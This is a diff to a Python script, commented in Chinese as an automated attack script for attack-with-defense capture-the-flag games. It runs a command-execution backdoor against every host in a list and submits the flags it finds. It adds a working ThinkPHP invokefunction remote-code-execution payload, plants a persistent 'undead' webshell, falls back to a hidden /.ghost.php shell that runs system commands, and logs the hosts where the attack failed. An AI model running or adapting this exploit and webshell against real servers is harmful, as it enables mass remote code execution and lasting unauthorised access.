@@ -1,3 +1,5 @@
+# coding=utf-8
+# awd自动化攻击脚本
 import sys
 import time
 import requests
@@ -29,8 +31,8 @@ def rename_file(file_name):  # 重命名旧文件
 ##########################################################################################
 
 
-def save_txt(txt):  # 写入flag到文件
-    with open('flag_list.txt', 'a') as file:
+def save_txt(txt, path='flag_list.txt'):  # 写入flag到文件
+    with open(path, 'a') as file:
         file.write(txt+'\r')
 ##########################################################################################
 
@@ -69,12 +71,14 @@ def submit(ip, flag_text):  # 提交flag
 
 
 def backdoor_attack(ip, url_path, method, payload):  # 利用命令执行后门漏洞攻击
+    url = ip + url_path +payload
+    print(url)
     try:
         if method == 'get':
             r = requests.get('http://' + ip + url_path + payload, timeout=5)
         elif method == 'post':
             r = requests.post("http://" + ip + url_path,
-                              data=payload, timout=5)
+                              data=payload, timeout=5)
         # 正则匹配flag
         flag = re.search(r'lhsw\{.*\}', r.text).group()
         # 打印攻击结果
@@ -136,9 +140,11 @@ def up_shell(ip, url_path, method, passwd):  # 上传不死马
 
 def main():
     ## get方法payload ####
-    url_path = '/index.php'
+    #url_path = '/index.php'
+    url_path = '/'
     method = 'get'
-    payload = '?copyright=cat /flag'
+    # payload = '?copyright=cat /flag'
+    payload = '?s=/admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20/flag'
     passwd = 'copyright'
     #####################
     ## post 方法payload ##
@@ -148,23 +154,24 @@ def main():
     #####################
     ip_txt = loadfile("./host_list.txt")
     ip_list = ip_txt.split("\n")
+    rename_file('./fail_list.txt')  # 修改旧失败ip列表文件名
     for ip in ip_list:
         if ip:
             flag = backdoor_attack(ip, url_path, method, payload)
-            udshell_url = ''
             if flag != False:
-                udshell_url = up_shell(ip, url_path, method, passwd)
                 submit(ip, flag)
+                up_shell(ip,url_path,'get','copyright')
                 save_txt(flag)
             else:  # 原有后门异常后尝试利用不死马
-                udshell_path = udshell_url.replace(
-                    'http://', '').replace('ip', '')
+                udshell_path = '/.ghost.php'
                 udshell_payload = {'pass': 'shang',
                                    'a': "system('cat /flag');"}
                 flag = backdoor_attack(
                     ip, udshell_path, 'post', udshell_payload)
                 if flag != False:
                     submit(ip, flag)
+                else:  # 记录攻击失败IP
+                    save_txt(ip, 'fail_list.txt')
 
 
 ##########################################################################################
